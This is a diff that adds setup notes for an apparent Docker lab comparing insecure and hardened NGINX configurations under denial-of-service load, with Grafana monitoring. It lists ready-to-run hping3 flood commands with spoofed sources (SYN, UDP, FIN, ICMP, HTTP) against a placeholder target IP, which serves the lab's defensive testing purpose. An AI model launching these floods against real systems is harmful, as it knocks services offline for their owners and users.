@@ -1,0 +1,32 @@
+docker-compose up -d
+
+HTTP Flood:
+docker exec -it attacker hping3 --rand-source --flood [TARGET_IP] -p 80
+
+
+TCP SYN Flood:
+docker exec -it attacker hping3 --rand-source -S -q -n --flood [TARGET_IP] -p 80
+
+UDP Flood:
+docker exec -it attacker hping3 --rand-source --udp --flood [TARGET_IP] -p 80
+
+TCP FIN Flood:
+docker exec -it attacker hping3 --rand-source -F --flood [TARGET_IP] -p 80
+
+ICMP Flood:
+docker exec -it attacker hping3 --rand-source -1 --flood [TARGET_IP]
+
+
+Observing Attacks in Grafana:
+	•	Open Grafana at http://localhost:3000
+	•	Login (admin/admin by default)
+	•	Connect to InfluxDB (http://influxdb:8086)
+	•	Create Dashboards to monitor:
+        •	Number of connections (limit_conn)
+        •	Requests per second (limit_req)
+        •	Blocked requests (403 errors)
+        •	Client IP addresses
+
+Comparing Insecure vs. Secure NGINX:
+	•	Run attacks against nginx_insecure (http://localhost:8080) → Expect service to slow down.
+	•	Run attacks against nginx_secure (http://localhost:8081) → Should mitigate attack effects.
